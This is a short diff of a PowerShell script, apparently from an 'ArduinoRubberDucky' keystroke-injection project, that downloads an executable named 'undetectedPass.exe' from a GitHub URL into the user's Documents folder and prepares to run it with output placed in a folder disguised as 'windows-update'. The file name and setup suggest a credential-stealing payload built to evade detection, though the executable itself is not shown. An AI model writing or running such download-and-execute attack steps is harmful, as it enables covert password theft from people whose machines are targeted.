@@ -1,5 +1,5 @@
 $URL = 'https://github.com/RRR3d/ArduinoRubberDucky/raw/main/undetectedPass.exe'
-$FilePath = "$env:USERPROFILE\Documents\pass.exe"
+$FilePath = "$env:USERPROFILE\Documents\undetectedPass.exe"
 $Command = "$FilePath --zip --dir $env:USERPROFILE\Documents\windows-update"
 
 # Download the file
